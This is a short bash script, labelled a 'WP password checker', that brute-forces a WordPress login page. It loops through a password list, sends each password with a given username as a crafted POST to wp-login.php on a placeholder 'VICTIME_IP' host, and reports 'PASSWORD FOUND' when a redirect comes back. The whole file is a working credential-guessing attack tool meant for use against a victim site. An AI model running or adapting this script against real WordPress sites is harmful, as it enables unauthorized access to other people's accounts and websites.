#!/bin/bash

#You must have to change the "VICTIME_IP" with the hostname OR targeted wordpress IP ADDR.

$1
$2

username="$1"
list="$2"

help()
{
    echo "you must provide arguments, example : ./script.sh USERNAME PASS_LIST"
}

if [ -z "$username" ]; then
    help
fi
if [ -z "$list" ]; then
    help
fi
banner()
{
clear
echo ""
echo ""
echo "WP password checker"
echo ""
echo ""
}

brut()
{
banner
    for password in $(cat "$list"); do
        if [ $( curl -i -s -k --max-time 0,09 -X $'POST'     -H $'Host: VICTIME-IP' -H $'Content-Length: 120' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://VICTIME_IP' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Referer: http://VICTIME_IP/wordpress/wp-login.php?redirect_to=http%3A%2F%2FVICTIME_IP%2Fwordpress%2Fwp-admin%2F&reauth=1' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7' -H $'Connection: close'     -b $'wordpress_test_cookie=WP%20Cookie%20check'     --data-binary $"log=$username&pwd=$password&wp-submit=Log+In&redirect_to=http%3A%2F%2FVICTIME_IP%2Fwordpress%2Fwp-admin%2F&testcookie=1"     $'http://VICTIME_IP/wordpress/wp-login.php' | grep -c "Location" ) = "1" ]; then
                echo "PASSWORD FOUND !!!!!!!"
		echo "password is $password"
                exit
            else
                echo "password : $password tested"
        fi
    done
}

#main
banner
brut
